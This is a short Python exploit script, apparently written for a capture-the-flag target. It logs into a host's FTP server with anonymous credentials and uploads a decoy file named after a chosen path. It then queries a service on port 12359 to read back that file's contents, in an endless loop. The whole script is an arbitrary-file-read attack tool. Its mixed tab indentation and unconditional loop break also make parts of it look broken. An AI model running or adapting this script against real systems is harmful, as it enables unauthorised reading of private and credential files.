import os
from ftplib import FTP
import socket
import sys

def read_file_and_upload(ip):
    # Ask user for the file path
    file_path = input("Enter file to read: ")
    
    # Create a file with the basename of the entered path
    file_name = file_path.split('/')[-1]
    try:
        with open(file_name, 'w') as new_file:
            pass  # Creates an empty file
    except Exception as e:
        print(e)
        pass
    
    # Connect to FTP server
    ftp = FTP(ip)
    ftp.login('ftp', 'blank')
    ftp.cwd('upload')  # Change to the upload folder
    
    try:
    	# Upload the created file
    	with open(file_name, 'rb') as file:
        	ftp.storbinary('STOR ' + file_name, file)
    except Exception as e:
        print(e)
        pass
    
    # Disconnect from FTP server
    ftp.quit()
    	
    # Connect to the socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, 12359))
        
        # Wait for message containing 'File'
        while True:
            data = s.recv(1024).decode()
            if 'File' in data:
                s.sendall(file_path.encode('UTF-8'))
            break
            
    
        # Receive results
        results = []
        while True:
            data = s.recv(1024).decode()
            if 'File to read' in data:
                break
            results += data.replace('[', ''). replace(']', '').replace('\\n', '').replace('\\t', '    ').strip("'").split("', '")
    
    # Display results line by line
    print('\n\n')
    for line in results:
        print(line.strip())
    print('\n\n')
    # Clean up - remove the created file
    os.remove(file_name)

print('Selected IP:',sys.argv[1])
while True:
	try:
	    read_file_and_upload(sys.argv[1])
	except:
	    pass
